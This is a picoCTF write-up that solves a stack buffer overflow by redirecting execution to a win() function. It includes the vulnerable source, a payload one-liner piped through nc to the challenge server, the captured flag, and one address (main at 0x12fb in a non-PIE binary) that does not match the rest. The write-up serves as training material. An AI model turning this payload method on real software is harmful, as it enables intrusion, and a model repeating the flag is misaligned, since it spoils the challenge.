# Echo Escape 1 — picoCTF (Binary Exploitation, Medium)

## Overview

A "secure echo service" reads user input into a 32-byte buffer using `read(0, buf, 128)` — classic buffer overflow. A `win()` function exists in the binary that prints the flag but is never called. The goal is to hijack the return address to redirect execution to `win`.

## Analysis

### Source code review

```c
void win() {
    FILE *fp = fopen("flag.txt", "rb");
    // reads and prints flag
}

int main() {
    char buf[32];
    read(0, buf, 128);    // reads 128 bytes into 32-byte buffer
    printf("Hello, %s\n", buf);
    return 0;
}
```

The vulnerability: `read` accepts up to 128 bytes into a 32-byte buffer with no bounds checking.

### Binary protections

```
$ checksec --file=vuln
RELRO         STACK CANARY   NX        PIE
Partial RELRO No canary      NX enabled No PIE
```

No canary (no stack overflow detection), no PIE (fixed addresses) — straightforward ret2win.

### Finding addresses

```bash
$ objdump -t vuln | grep -E "win|main"
0000000000401256 g     F .text  00000000000000a5  win
00000000000012fb g     F .text  0000000000000079  main
```

`win` = `0x401256`

### Stack layout (x86_64)

```
[buf: 32 bytes][saved rbp: 8 bytes][return address: 8 bytes]
               ^                    ^
               offset 32            offset 40 — TARGET
```

Total padding needed: 40 bytes (32 buf + 8 saved rbp).

## Exploit

```bash
$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*40 + b'\x56\x12\x40\x00\x00\x00\x00\x00')" | nc mysterious-sea.picoctf.net 64462
Welcome to the secure echo service!
Please enter your name: Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAV@
Thank you for using our service.
picoCTF{3ch0_s3rv1c3_br34k5_22f4ab1e}
```

## Tools used

- `objdump -t` — read symbol table to find `win` address
- `checksec` — check binary protections (PIE, canary, NX)
- `python3` — generate binary payload (40 bytes padding + return address in little-endian)
- `nc` — connect to remote server

## Key takeaway

Without stack canaries or PIE, a buffer overflow with a known `win` function is a textbook ret2win: pad to the return address and overwrite it with the target. The 64-bit address must be written in little-endian and padded to 8 bytes.
